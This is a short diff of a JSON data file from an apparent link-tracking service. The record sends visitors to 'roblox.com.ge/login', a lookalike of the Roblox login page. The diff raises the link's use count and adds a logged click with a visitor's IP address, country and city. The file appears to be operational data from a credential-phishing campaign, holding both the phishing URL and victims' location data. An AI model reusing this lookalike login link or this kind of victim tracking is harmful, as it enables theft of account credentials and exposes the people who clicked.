@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1085,
+    "useCount": 1086,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8824,6 +8824,14 @@
         "city": "Thị Trấn Phú Mỹ",
         "flag": "🇻🇳",
         "countryCode": "VN"
+      },
+      {
+        "timestamp": 1777257041076,
+        "ip": "208.131.182.206",
+        "country": "Jamaica",
+        "city": "Limit",
+        "flag": "🇯🇲",
+        "countryCode": "JM"
       }
     ]
   },
